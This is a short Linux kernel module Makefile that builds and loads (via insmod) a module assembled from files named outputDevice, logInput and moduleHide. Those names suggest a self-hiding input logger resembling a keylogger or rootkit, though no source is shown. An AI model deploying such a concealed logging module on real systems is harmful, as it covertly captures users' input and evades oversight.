
MAKEDIR = $(shell pwd)
KMAKEDIR = /lib/modules/$(shell uname -r)/build
MODULE = main.o

obj-m += main.o
main-y := outputDevice.o logInput.o moduleHide.o


all:
	make -C $(KMAKEDIR) M=$(MAKEDIR) modules
#	make -C $(KMAKEDIR) M=$PWD main.o
#	#make -C $(KMAKEDIR) M=$PWD outputDevice.o
#	#make -C $(KMAKEDIR) M=$PWD logInput.o
#	#make -C $(KMAKEDIR) M=$PWD /
	
clean:
	make -C $(KMAKEDIR) M=$(MAKEDIR) clean

install: all
	insmod ./main.ko
#	make -C /lib/modules/`uname -r`/build M=$(PWD) modules_install

uninstall: 
	rmmod ./main.ko